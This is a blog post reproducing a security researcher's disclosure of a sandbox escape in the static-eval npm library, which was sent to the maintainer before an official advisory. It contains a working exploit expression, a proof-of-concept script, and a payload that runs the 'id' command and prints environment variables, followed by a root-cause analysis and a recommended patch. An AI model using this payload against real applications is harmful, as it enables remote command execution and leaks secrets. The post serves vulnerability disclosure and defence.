<!DOCTYPE html>
<html prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article# " lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>static-eval sandbox escape original writeup | Licencia para Hackear</title>
<link href="../../../assets/css/all-nocdn.css" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Playfair+Display:700,900" rel="stylesheet">
<meta name="theme-color" content="#5670d4">
<meta name="generator" content="Nikola (getnikola.com)">
<link rel="alternate" type="application/rss+xml" title="RSS (en)" href="../../rss.xml">
<link rel="alternate" type="application/rss+xml" title="RSS (es)" href="../../../rss.xml">
<link rel="canonical" href="https://licenciaparahackear.github.io/en/posts/static-eval-sandbox-escape-original-writeup/">
<!--[if lt IE 9]><script src="../../../assets/js/html5.js"></script><![endif]--><meta name="author" content="Matías Lang">
<meta property="og:site_name" content="Licencia para Hackear">
<meta property="og:title" content="static-eval sandbox escape original writeup">
<meta property="og:url" content="https://licenciaparahackear.github.io/en/posts/static-eval-sandbox-escape-original-writeup/">
<meta property="og:description" content="This is the original writeup I sent to the static-eval mantainer and to the
NodeJS security team before they published an official
advisory:


Hi! I found a vulnerability in the static-eval npm librar">
<meta property="og:type" content="article">
<meta property="article:published_time" content="2019-02-17T02:53:30-03:00">
<link rel="alternate" hreflang="es" href="../../../posts/static-eval-sandbox-escape-original-writeup/">
</head>
<body>
<a href="#content" class="sr-only sr-only-focusable">Skip to main content</a>

<!-- Header and menu bar -->
<div class="container">
      <header class="blog-header py-3"><div class="row nbb-header align-items-center">
          <div class="col-md-3 col-xs-2 col-sm-2" style="width: auto;">
            <button class="navbar-toggler navbar-light bg-light nbb-navbar-toggler" type="button" data-toggle="collapse" data-target=".bs-nav-collapsible" aria-controls="bs-navbar" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse bs-nav-collapsible bootblog4-search-form-holder">
                
            </div>
        </div>
          <div class="col-md-6 col-xs-10 col-sm-10 bootblog4-brand" style="width: auto;">
            <a class="navbar-brand blog-header-logo text-dark" href="https://licenciaparahackear.github.io/en/">

            <span id="blog-title">Licencia para Hackear</span>
        </a>
          </div>
            <div class="col-md-3 justify-content-end align-items-center bs-nav-collapsible collapse flex-collapse bootblog4-right-nav">
            <nav class="navbar navbar-light bg-white"><ul class="navbar-nav bootblog4-right-nav">
<li class="nav-item"><a href="https://licenciaparahackear.github.io/" rel="alternate" hreflang="es" class="nav-link">Español</a></li>

                    
                    
    
    <li class="nav-item">
    <a href="index.md" id="sourcelink" class="nav-link">Source</a>
    </li>


                    
            </ul></nav>
</div>
    </div>
</header><nav class="navbar navbar-expand-md navbar-light bg-white static-top"><div class="collapse navbar-collapse bs-nav-collapsible" id="bs-navbar">
            <ul class="navbar-nav nav-fill d-flex w-100">
<li class="nav-item">
<a href="../../archive.html" class="nav-link">Archive</a>
                </li>
<li class="nav-item">
<a href="../../categories/" class="nav-link">Tags</a>
                </li>
<li class="nav-item">
<a href="../../rss.xml" class="nav-link">RSS feed</a>

                
            </li>
</ul>
</div>
<!-- /.navbar-collapse -->
</nav>
</div>

<div class="container" id="content" role="main">
    <div class="body-content">
        <!--Body content-->
        
        
        
<article class="post-text h-entry hentry postpage" itemscope="itemscope" itemtype="http://schema.org/Article"><header><h1 class="p-name entry-title" itemprop="headline name"><a href="." class="u-url">static-eval sandbox escape original writeup</a></h1>

        <div class="metadata">
            <p class="byline author vcard p-author h-card"><span class="byline-name fn p-name" itemprop="author">
                    Matías Lang
            </span></p>
            <p class="dateline">
            <a href="." rel="bookmark">
            <time class="published dt-published" datetime="2019-02-17T02:53:30-03:00" itemprop="datePublished" title="2019-02-17 02:53">2019-02-17 02:53</time></a>
            </p>
                <p class="commentline">
        
    <a href="#disqus_thread" data-disqus-identifier="cache/posts/static-eval-sandbox-escape-original-writeup.html">Comments</a>


            
        </p>
<p class="sourceline"><a href="index.md" class="sourcelink">Source</a></p>

        </div>
        

    </header><div class="e-content entry-content" itemprop="articleBody text">
    <div>
<p>This is the original writeup I sent to the static-eval mantainer and to the
NodeJS security team before they published <a href="https://www.npmjs.com/advisories/758">an official
advisory</a>:</p>
<pre>

Hi! I found a vulnerability in the static-eval npm library to escape the
sandbox offered by it.

The static-eval module is intended to statically evaluate a code block. In
theory (and assumed by many modules who depend on it) should have no side
effects, should not have have access to the standard library, and effectively
be sandboxed. However if un-sanitized user input is passed to evaluate we can
break out of this “sandbox”.

To find the sandbox escape I was inspired by the previous work done by Matt
Austin[1]. Unlike Matt's technique, mine requires that a variable is defined
and that its value is anything other than a function.

This is the final expression I used to escape the sandbox (I use x as the
variable that is not a function):

    (function({x}){return x.constructor})({x:"".sub})("console.log(process.env)")()

To verify that the vulnerability exists, you can run `npm install static-eval` and
write the following to an eval.js file:

    var evaluate = require('static-eval');
    var parse = require('esprima').parse;

    var src = process.argv[2];
    var ast = parse(src).body[0].expression;

    console.log(evaluate(ast, {x:1}));

(this a modified version of the example on the readme[2]. The only change I did
was to define the x variable so my exploit works)

Then, run the following:

    node eval.js '(function({x}){return x.constructor})({x:"".sub})("console.log(process.env)")()'

To log the environment variables of the system, confirming the presence of the
vulnerability. You can also execute more dangerous payloads, such as this one
that will execute the `id` command on the system and print its output:

    node eval.js '(function({x}){return x.constructor})({x:"".sub})("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()'

It can also be replaced by any other OS command.


Exploit explaination
--------------------

Blocking access to function attributes in version 2.0 was surprisingly a good
way of preventing the majority of the JS sandbox bypass techniques so I had to
be more creative to achieve it. Matt already pointed out[3] that the dynamic
Function call should be refactored so I targeted that.

I noted that when you define an inline function, its body is analyzed to check
you don't access attributes of functions. This check is done when the function
is defined and not when it is called. This sounded strange to me so I started
looking at it.

To decide the type of the variables at definition time, it uses the initial
variables passed to the evaluate function. Then, to ensure its value is not
overwritten in function parameters, it sets the value of variables named as a
function parameter to null:

    node.params.forEach(function(key) {
        if(key.type == 'Identifier'){
          vars[key.name] = null;
        }
    });

Unfortunately, this doesn't work as expected if I use object destructuring[4]
in the function parameters. In this case, the value of `key.type` will be
`ObjectPattern` so the variable won't be set to null. Then, the system will
confuse between the initial value of the variable and the actual one that
depends on the function call. For example, if I eval this when x has an initial
value of 1:

    (function({x}){return x.constructor})({x:"".sub})

when the function is defined, the system will think that I'm accessing the
constructor of 1 (the initial value of x). This is allowed so the function will
be created. But actually, when the function is executed the value of x will
depend on the function parameters. In this case it will be "".sub that is a
function, so the whole expression will return the function constructor, that
I'm not supposed to access.


Recommended fix
--------------

The easiest thing to do to fix this exploitation technique would be to forbid
function definitions that use parameter destructuring:

    node.params.forEach(function(key) {
        if(key.type == 'Identifier'){
          vars[key.name] = null;
        }
        else return FAIL;
    });

However, I believe there might be other similar techniques to escape the
sandbox again, so the long-term fix would be, as Matt said before, to refactor
out the dynamic Function call completely.


References
----------

[1] https://maustin.net/articles/2017-10/static_eval
[2] https://github.com/substack/static-eval#example
[3] https://github.com/substack/static-eval/pull/18
[4] https://simonsmith.io/destructuring-objects-as-function-parameters-in-es6/

</pre>
</div>
    </div>
    <aside class="postpromonav"><nav></nav></aside><section class="comments hidden-print"><h2>Comments</h2>
        
        
        <div id="disqus_thread"></div>
        <script>
        var disqus_shortname ="licenciaparahackear",
            disqus_url="https://licenciaparahackear.github.io/en/posts/static-eval-sandbox-escape-original-writeup/",
        disqus_title="static-eval sandbox escape original writeup",
        disqus_identifier="cache/posts/static-eval-sandbox-escape-original-writeup.html",
        disqus_config = function () {
            this.language = "en";
        };
        (function() {
            var dsq = document.createElement('script'); dsq.async = true;
            dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
</noscript>
    <a href="https://disqus.com" class="dsq-brlink" rel="nofollow">Comments powered by <span class="logo-disqus">Disqus</span></a>


        </section></article><script>var disqus_shortname="licenciaparahackear";(function(){var a=document.createElement("script");a.async=true;a.src="https://"+disqus_shortname+".disqus.com/count.js";(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(a)}());</script><!--End of body content--><footer id="footer">
            Contents © 2020         <a href="mailto:pub@matiaslang.me">Matías Lang</a> - Powered by         <a href="https://getnikola.com" rel="nofollow">Nikola</a>         
<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Licencia Creative Commons" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/4.0/88x31.png"></a><br>Esta obra está bajo una <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Licencia Creative Commons Atribución-CompartirIgual 4.0 Internacional</a>.

            
            
        </footer>
</div>
</div>


        <script src="../../../assets/js/all-nocdn.js"></script><script>
    baguetteBox.run('div#content', {
        ignoreClass: 'islink',
        captions: function(element) {
            return element.getElementsByTagName('img')[0].alt;
    }});
    </script><script data-goatcounter="https://lph.goatcounter.com/count" async src="//gc.zgo.at/count.js"></script>
</body>
</html>
